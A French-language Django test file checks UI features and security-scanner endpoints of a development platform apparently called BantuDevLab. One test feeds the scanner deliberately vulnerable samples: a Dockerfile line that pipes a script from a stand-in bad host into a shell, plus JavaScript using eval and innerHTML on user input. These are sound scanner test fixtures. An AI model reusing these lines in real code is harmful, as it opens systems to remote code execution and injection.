"""
Tests for Axe 4: Design System, Interface Graphique & UX Moderne (UI/UX).
Validates UI-01 to UI-05:
- UI-01: Web Code Editor (CodeMirror) on dashboard workbench.
- UI-02: Modern Visual Dashboard & Vulnerability Cards, Circular Gauge for Sovereignty.
- UI-03: Interactive ZKP Wizard, BIP-39 mnemonic generator, key strength meter, protected key download.
- UI-04: Global Toast Notification System in base template and CSS.
- UI-05: Panafrican Sovereign Nodes Interactive Map & Telemetry.
"""

from django.test import Client, TestCase
from django.urls import reverse


class Axe4UITestCase(TestCase):
    def setUp(self):
        self.client = Client()

    def test_ui04_toast_notification_system_in_base(self):
        """UI-04: Vérifie la présence du conteneur Toast et du système de notification dans base.html."""
        resp = self.client.get(reverse("home"))
        self.assertEqual(resp.status_code, 200)
        content = resp.content.decode("utf-8")

        # Conteneur Toast
        self.assertIn('id="toastContainer"', content)
        self.assertIn('class="toast-container"', content)
        # Helper global window.showToast
        self.assertIn("window.showToast", content)
        self.assertIn("toast-item toast-", content)

    def test_ui01_and_ui02_dashboard_code_editor_and_visualizations(self):
        """UI-01 & UI-02: Vérifie la présence de CodeMirror et des composants graphiques (jauge, cartes)."""
        resp = self.client.get(reverse("dashboard"))
        self.assertEqual(resp.status_code, 200)
        content = resp.content.decode("utf-8")

        # UI-01: Code Editor & Workbench
        self.assertIn("codemirror", content.lower())
        self.assertIn('id="codeEditorMount"', content)
        self.assertIn('id="scanCodeInput"', content)
        self.assertIn("workbench_security_audit.py", content)
        self.assertIn("initCodeEditor", content)

        # UI-02: Visual Dashboard, Circular Gauge & Vulnerability Cards
        self.assertIn("sovereignty-gauge-card", content)
        self.assertIn('id="gaugeProgressCircle"', content)
        self.assertIn('id="gaugeScoreText"', content)
        self.assertIn('id="vulnerabilitiesContainer"', content)
        self.assertIn("vulnerability-card", content)
        self.assertIn("pillCriticalCount", content)
        self.assertIn("renderVulnerabilityCards", content)

    def test_ui03_zkp_interactive_wizard_and_identity_manager(self):
        """UI-03: Vérifie l'assistant ZKP interactif (BIP-39, jauge de force, téléchargement de clé)."""
        resp = self.client.get(reverse("zkp_auth:zkp_login_page"))
        self.assertEqual(resp.status_code, 200)
        content = resp.content.decode("utf-8")

        # Wizard Navigation & Steps
        self.assertIn("zkp-wizard-card", content)
        self.assertIn("zkp-steps-nav", content)
        self.assertIn("wizardStep1", content)
        self.assertIn("wizardStep2", content)
        self.assertIn("wizardStep3", content)

        # BIP-39 Mnemonic & Cryptographic Strength
        self.assertIn("BIP-39", content)
        self.assertIn('id="mnemonicWordsGrid"', content)
        self.assertIn("generateNewMnemonic", content)
        self.assertIn('id="strengthBar"', content)
        self.assertIn("updateCryptoStrengthMeter", content)

        # Sovereign Key Download
        self.assertIn("downloadSovereignKeyFile", content)
        self.assertIn(".json", content)

    def test_ui05_panafrican_metrics_map_and_nodes(self):
        """UI-05: Vérifie la cartographie interactive des nœuds souverains africains."""
        resp = self.client.get(reverse("sovereignty_metrics"))
        self.assertEqual(resp.status_code, 200)
        content = resp.content.decode("utf-8")

        # Map Wrapper & SVG
        self.assertIn("africa-map-wrapper", content)
        self.assertIn("map-svg-container", content)

        # 5 Nœuds Souverains Africains
        for node in ["Abidjan", "Dakar", "Lagos", "Kigali", "Nairobi"]:
            self.assertIn(node, content)

        # Cartes et Télémétrie de Latence
        self.assertIn("node-cards-grid", content)
        self.assertIn('id="card-abidjan"', content)
        self.assertIn('id="card-dakar"', content)
        self.assertIn('id="card-lagos"', content)
        self.assertIn('id="card-kigali"', content)
        self.assertIn('id="card-nairobi"', content)
        self.assertIn('id="nodeDetailsBanner"', content)
        self.assertIn("simulatePingAllNodes", content)

    def test_style_css_contains_axe4_classes(self):
        """Vérifie que static/css/style.css contient les classes CSS des composants de l'Axe 4."""
        import os

        from django.conf import settings

        css_path = os.path.join(settings.BASE_DIR, "static", "css", "style.css")
        self.assertTrue(os.path.exists(css_path))
        with open(css_path, "r", encoding="utf-8") as f:
            css_content = f.read()

        # UI-04 Toast
        self.assertIn(".toast-container", css_content)
        self.assertIn(".toast-item", css_content)

        # UI-01 & UI-02 Editor & Visualisations
        self.assertIn(".editor-container", css_content)
        self.assertIn(".circular-gauge-wrapper", css_content)
        self.assertIn(".vulnerability-card", css_content)
        self.assertIn(".badge-critical", css_content)

        # UI-03 ZKP Wizard
        self.assertIn(".zkp-wizard-card", css_content)
        self.assertIn(".mnemonic-grid", css_content)
        self.assertIn(".strength-meter-bar", css_content)

        # UI-05 Map
        self.assertIn(".africa-map-wrapper", css_content)
        self.assertIn(".map-node-pulse", css_content)
        self.assertIn(".node-cards-grid", css_content)

    def test_t_tab_1001_and_1002_markdown_table_primer_and_sorting(self):
        """T-TAB-1001 & T-TAB-1002 : Verification des styles Primer de tableaux et tri dynamique."""
        from pathlib import Path

        css_light = Path("custom/public/assets/css/theme-github.css").read_text(encoding="utf-8")
        self.assertIn(".markdown table", css_light)
        self.assertIn("border-collapse: collapse", css_light)

        css_dark = Path("custom/public/assets/css/theme-github-dark.css").read_text(encoding="utf-8")
        self.assertIn(".markdown table", css_dark)

        header_tmpl = Path("custom/templates/custom/header.tmpl").read_text(encoding="utf-8")
        self.assertIn("T-TAB-1002", header_tmpl)
        self.assertIn("data-sort", header_tmpl)

    def test_t_prf_1201_and_1202_pinned_repos_and_profile_readme(self):
        """T-PRF-1201 & T-PRF-1202 : Verification des cartes de depots epingles et profil README."""
        from pathlib import Path

        css_light = Path("custom/public/assets/css/theme-github.css").read_text(encoding="utf-8")
        self.assertIn(".gh-pinned-repo-card", css_light)
        self.assertIn(".repo-language-color", css_light)

        css_dark = Path("custom/public/assets/css/theme-github-dark.css").read_text(encoding="utf-8")
        self.assertIn(".gh-pinned-repo-card", css_dark)

        header_tmpl = Path("custom/templates/custom/header.tmpl").read_text(encoding="utf-8")
        self.assertIn("T-PRF-1202", header_tmpl)
        self.assertIn("README.md", header_tmpl)

    def test_t_ntf_1601_and_1602_notifications_inbox_and_filter_tabs(self):
        """T-NTF-1601 & T-NTF-1602 : Verification des styles et filtres dynamiques des notifications."""
        from pathlib import Path

        css_light = Path("custom/public/assets/css/theme-github.css").read_text(encoding="utf-8")
        self.assertIn(".gh-notifications-nav", css_light)
        self.assertIn(".gh-notification-item", css_light)
        self.assertIn(".gh-notification-unread", css_light)

        css_dark = Path("custom/public/assets/css/theme-github-dark.css").read_text(encoding="utf-8")
        self.assertIn(".gh-notifications-nav", css_dark)
        self.assertIn(".gh-filter-badge", css_dark)

        header_tmpl = Path("custom/templates/custom/header.tmpl").read_text(encoding="utf-8")
        self.assertIn("T-NTF-1602", header_tmpl)
        self.assertIn("gh-notif-nav", header_tmpl)
        self.assertIn("data-filter", header_tmpl)

    def test_t_src_1801_and_1802_code_search_qualifiers_and_docs(self):
        """T-SRC-1801 & T-SRC-1802 : Verification des styles et popover des qualificateurs de recherche de code."""
        from pathlib import Path

        css_light = Path("custom/public/assets/css/theme-github.css").read_text(encoding="utf-8")
        self.assertIn(".gh-search-qualifiers-popover", css_light)
        self.assertIn(".gh-qualifier-badge", css_light)

        css_dark = Path("custom/public/assets/css/theme-github-dark.css").read_text(encoding="utf-8")
        self.assertIn(".gh-search-qualifiers-popover", css_dark)

        header_tmpl = Path("custom/templates/custom/header.tmpl").read_text(encoding="utf-8")
        self.assertIn("T-SRC-1802", header_tmpl)
        self.assertIn("gh-search-qualifiers-popover", header_tmpl)
        self.assertIn("path:", header_tmpl)

        doc_path = Path("docs/SOVEREIGN_CODE_SEARCH.md")
        self.assertTrue(doc_path.exists())
        doc_content = doc_path.read_text(encoding="utf-8")
        self.assertIn("REPO_INDEXER_TYPE = bleve", doc_content)
        self.assertIn("symbol:", doc_content)

    def test_t_sug_1901_and_1902_pr_suggested_changes(self):
        """T-SUG-1901 & T-SUG-1902 : Verification des styles Primer et du polyfill de suggestions de code."""
        from pathlib import Path

        css_light = Path("custom/public/assets/css/theme-github.css").read_text(encoding="utf-8")
        self.assertIn(".gh-suggestion-box", css_light)
        self.assertIn(".gh-suggestion-header", css_light)
        self.assertIn(".gh-suggestion-btn", css_light)

        css_dark = Path("custom/public/assets/css/theme-github-dark.css").read_text(encoding="utf-8")
        self.assertIn(".gh-suggestion-box", css_dark)

        header_tmpl = Path("custom/templates/custom/header.tmpl").read_text(encoding="utf-8")
        self.assertIn("T-SUG-1902", header_tmpl)
        self.assertIn("Suggested change", header_tmpl)
        self.assertIn("Apply suggestion", header_tmpl)

    def test_t_grp_2001_and_2002_commit_network_graph(self):
        """T-GRP-2001 & T-GRP-2002 : Verification des styles Primer et de l'amelioration topologique SVG."""
        from pathlib import Path

        css_light = Path("custom/public/assets/css/theme-github.css").read_text(encoding="utf-8")
        self.assertIn(".gh-graph-container", css_light)
        self.assertIn(".gh-graph-dot", css_light)
        self.assertIn(".gh-graph-branch-tag", css_light)

        css_dark = Path("custom/public/assets/css/theme-github-dark.css").read_text(encoding="utf-8")
        self.assertIn(".gh-graph-container", css_dark)

        header_tmpl = Path("custom/templates/custom/header.tmpl").read_text(encoding="utf-8")
        self.assertIn("T-GRP-2002", header_tmpl)
        self.assertIn("gh-graph-canvas", header_tmpl)
        self.assertIn("#0969da", header_tmpl)

    def test_t_mls_2101_and_2102_milestones_burndown_progress(self):
        """T-MLS-2101 & T-MLS-2102 : Verification des styles Primer et du calculateur de jalons."""
        from pathlib import Path

        css_light = Path("custom/public/assets/css/theme-github.css").read_text(encoding="utf-8")
        self.assertIn(".gh-milestone-card", css_light)
        self.assertIn(".gh-milestone-progress-bar", css_light)
        self.assertIn(".gh-milestone-progress-fill", css_light)

        css_dark = Path("custom/public/assets/css/theme-github-dark.css").read_text(encoding="utf-8")
        self.assertIn(".gh-milestone-card", css_dark)

        header_tmpl = Path("custom/templates/custom/header.tmpl").read_text(encoding="utf-8")
        self.assertIn("T-MLS-2102", header_tmpl)
        self.assertIn("gh-milestone-progress-bar", header_tmpl)
        self.assertIn("complete", header_tmpl)

    def test_t_drf_2301_and_2302_draft_prs_flow(self):
        """T-DRF-2301 & T-DRF-2302 : Verification des styles et flux de draft pull requests."""
        from pathlib import Path

        css_light = Path("custom/public/assets/css/theme-github.css").read_text(encoding="utf-8")
        self.assertIn(".gh-draft-badge", css_light)
        self.assertIn(".gh-draft-banner", css_light)
        self.assertIn(".gh-ready-for-review-btn", css_light)

        css_dark = Path("custom/public/assets/css/theme-github-dark.css").read_text(encoding="utf-8")
        self.assertIn(".gh-draft-badge", css_dark)

        header_tmpl = Path("custom/templates/custom/header.tmpl").read_text(encoding="utf-8")
        self.assertIn("T-DRF-2302", header_tmpl)
        self.assertIn("Ready for review", header_tmpl)
        self.assertIn("Draft pull requests cannot be merged", header_tmpl)

    def test_responsive_multi_screen_breakpoints_across_all_interfaces(self):
        """Vérifie la présence des règles CSS responsives multi-écrans (280px à 4K) sur toutes les interfaces."""
        from pathlib import Path

        style_css = Path("static/css/style.css").read_text(encoding="utf-8")
        for bp in [
            "min-width: 1600px",
            "max-width: 1200px",
            "max-width: 992px",
            "max-width: 768px",
            "max-width: 576px",
            "max-width: 380px",
            ".dashboard-kpi-grid",
            ".dashboard-main-grid",
            ".table-responsive",
        ]:
            self.assertIn(bp, style_css)

        resp_dash = self.client.get(reverse("dashboard"))
        dash_html = resp_dash.content.decode("utf-8")
        self.assertIn("dashboard-kpi-grid", dash_html)
        self.assertIn("dashboard-main-grid", dash_html)
        self.assertIn("table-responsive", dash_html)

        header_tmpl = Path("custom/templates/custom/header.tmpl").read_text(encoding="utf-8")
        self.assertIn("max-width: 768px", header_tmpl)
        self.assertIn("max-width: 480px", header_tmpl)

        footer_tmpl = Path("custom/templates/custom/footer.tmpl").read_text(encoding="utf-8")
        self.assertIn("calc(100vw - 24px)", footer_tmpl)

        forge_py = Path("forge_server.py").read_text(encoding="utf-8")
        self.assertIn("max-width: 768px", forge_py)
        self.assertIn("max-width: 480px", forge_py)

    def test_multilang_demo_snippets_and_language_sync(self):
        """Vérifie la synchronisation multilingue (fr/en/sw/pt) pour SAST & Gemma ainsi que les 4 démos (Python, Dockerfile, YAML, JavaScript)."""
        import json

        # 1. Dashboard contient les 4 types de démos vulnérables et les boutons de sélection
        resp_dash = self.client.get(reverse("dashboard"))
        self.assertEqual(resp_dash.status_code, 200)
        dash_html = resp_dash.content.decode("utf-8")
        self.assertIn("DEMO_FILES_META", dash_html)
        self.assertIn("Dockerfile.sovereign", dash_html)
        self.assertIn("gitlab-ci-sovereign.yml", dash_html)
        self.assertIn("workbench_payment_gateway.js", dash_html)
        self.assertIn('data-demo-type="python"', dash_html)
        self.assertIn('data-demo-type="dockerfile"', dash_html)
        self.assertIn('data-demo-type="yaml"', dash_html)
        self.assertIn('data-demo-type="javascript"', dash_html)

        # 2. Scan SAST Dockerfile en anglais (en) et swahili (sw)
        dockerfile_code = (
            "FROM python:latest\nUSER root\nENV SECRET_TOKEN = 'hardcoded123456'\nRUN curl -sSL https://bad.sh | sh\n"
        )
        scan_en = self.client.post(
            "/api/security/scan/",
            data=json.dumps({"filename": "Dockerfile", "content": dockerfile_code, "lang": "en"}),
            content_type="application/json",
            HTTP_X_BANTU_WORKBENCH="interactive-demo",
        )
        self.assertEqual(scan_en.status_code, 200)
        data_en = scan_en.json()
        self.assertEqual(data_en["lang"], "en")
        self.assertGreaterEqual(data_en["total_issues"], 3)
        descs_en = " | ".join(v["description"] for v in data_en["issues"])
        self.assertIn("Unpinned Docker image (:latest)", descs_en)
        self.assertIn("Secret exposed in Dockerfile ENV", descs_en)

        # 3. Scan SAST JavaScript en portugais (pt)
        js_code = "const x = eval(userInput);\ndocument.getElementById('a').innerHTML = userInput;\n"
        scan_pt = self.client.post(
            "/api/security/scan/",
            data=json.dumps({"filename": "app.js", "content": js_code, "lang": "pt"}),
            content_type="application/json",
            HTTP_X_BANTU_WORKBENCH="interactive-demo",
        )
        self.assertEqual(scan_pt.status_code, 200)
        data_pt = scan_pt.json()
        self.assertEqual(data_pt["lang"], "pt")
        descs_pt = " | ".join(v["description"] for v in data_pt["issues"])
        self.assertIn("eval()", descs_pt)
        self.assertIn("innerHTML", descs_pt)

        # 4. Ask Gemma Review synchronisé en anglais (en) et swahili (sw)
        from unittest.mock import patch

        with patch("apps.ai_assistant.gemma.requests.post", side_effect=ConnectionError("offline")):
            gemma_en = self.client.post(
                "/api/ai/review/",
                data=json.dumps({"filename": "Dockerfile", "code": dockerfile_code, "lang": "en"}),
                content_type="application/json",
                HTTP_X_BANTU_WORKBENCH="interactive-demo",
            )
            self.assertEqual(gemma_en.status_code, 200)
            self.assertIn("BantuDevLab AI Review (Sovereign Gemma 2 2B Engine)", gemma_en.json()["response"])

            gemma_sw = self.client.post(
                "/api/ai/review/",
                data=json.dumps({"filename": "app.js", "code": js_code, "lang": "sw"}),
                content_type="application/json",
                HTTP_X_BANTU_WORKBENCH="interactive-demo",
            )
            self.assertEqual(gemma_sw.status_code, 200)
            self.assertIn("Ukaguzi wa BantuDevLab AI", gemma_sw.json()["response"])

    def test_pro_command_terminal_and_repo_actions(self):
        """Vérifie le terminal de commande Pro sans zone de saisie libre et les endpoints d'analyse de dépôt Gitea."""
        import json
        from pathlib import Path

        # 1. Script terminal présent et lié dans Django et Gitea
        terminal_js = Path("static/js/bantu-command-terminal.js").read_text(encoding="utf-8")
        self.assertIn("bantu-command-terminal-modal", terminal_js)
        self.assertIn("bantu-cmd-plus-btn", terminal_js)
        self.assertIn("bantu-cmd-repo-select", terminal_js)
        self.assertIn("bantu-cmd-branch-select", terminal_js)
        self.assertIn("bantu-cmd-file-select", terminal_js)
        self.assertIn("bantu-cmd-exec-btn", terminal_js)
        self.assertIn("bantu-cmd-results-panel", terminal_js)
        self.assertIn("openBantuCommandTerminal", terminal_js)

        repo_header = Path("custom/templates/repo/header.tmpl").read_text(encoding="utf-8")
        self.assertIn("openBantuCommandTerminal('security'", repo_header)
        self.assertIn("openBantuCommandTerminal('gemma'", repo_header)

        # 2. Endpoint RepoExplorerView (/api/forge/repo-explorer/)
        explorer_resp = self.client.get("/api/forge/repo-explorer/?lang=en")
        self.assertEqual(explorer_resp.status_code, 200)
        explorer_data = explorer_resp.json()
        self.assertIn("repositories", explorer_data)
        self.assertGreaterEqual(len(explorer_data["repositories"]), 1)
        self.assertIn("branches", explorer_data)
        self.assertIn("files", explorer_data)

        # 3. Endpoint RepoCommandAnalyzeView (/api/forge/repo-analyze/) pour Security & Gemma sur tous les fichiers (*)
        sec_resp = self.client.post(
            "/api/forge/repo-analyze/",
            data=json.dumps(
                {
                    "action": "security",
                    "repository": "SovereignCore/Bantu-Network-Node",
                    "branch": "main",
                    "file_path": "*",
                    "lang": "en",
                }
            ),
            content_type="application/json",
        )
        self.assertEqual(sec_resp.status_code, 200)
        sec_data = sec_resp.json()
        self.assertEqual(sec_data["action"], "security")
        self.assertGreaterEqual(len(sec_data["files_analyzed"]), 1)
        self.assertIn("sovereignty_score", sec_data)

        from unittest.mock import patch

        with patch("apps.ai_assistant.gemma.requests.post", side_effect=ConnectionError("offline")):
            gemma_resp = self.client.post(
                "/api/forge/repo-analyze/",
                data=json.dumps(
                    {
                        "action": "gemma",
                        "repository": "SovereignCore/Bantu-Network-Node",
                        "branch": "main",
                        "file_path": "Dockerfile",
                        "lang": "fr",
                    }
                ),
                content_type="application/json",
            )
            self.assertEqual(gemma_resp.status_code, 200)
            gemma_data = gemma_resp.json()
            self.assertEqual(gemma_data["action"], "gemma")
            self.assertIn("response", gemma_data)

    def test_faq_three_steps_closed_by_default_and_gitea_headbar_explore_alignment(self):
        """Vérifie que les 3 étapes fondamentales de la FAQ sont fermées par défaut et que la barre d'en-tête Gitea place les actions après [Explore]."""
        from pathlib import Path

        resp_faq = self.client.get(reverse("faq"))
        self.assertEqual(resp_faq.status_code, 200)
        faq_html = resp_faq.content.decode("utf-8")
        self.assertIn('<details class="faq-item" id="faq-create-account">', faq_html)
        self.assertIn('<details class="faq-item" id="faq-login">', faq_html)
        self.assertIn('<details class="faq-item" id="faq-view-source">', faq_html)
        self.assertNotIn('<details class="faq-item" open id="faq-create-account">', faq_html)
        self.assertNotIn('<details class="faq-item" open id="faq-login">', faq_html)
        self.assertNotIn('<details class="faq-item" open id="faq-view-source">', faq_html)

        terminal_js = Path("static/js/bantu-command-terminal.js").read_text(encoding="utf-8")
        self.assertIn("nav#navbar .navbar-left", terminal_js)
        self.assertIn('a.item[href*="/explore"]', terminal_js)
        self.assertIn("fetchLiveGiteaData", terminal_js)

        nginx_conf = Path("deploy/nginx/bantudevlab.conf").read_text(encoding="utf-8")
        self.assertIn("sub_filter '</head>'", nginx_conf)
        self.assertIn("/static/js/bantu-command-terminal.js", nginx_conf)
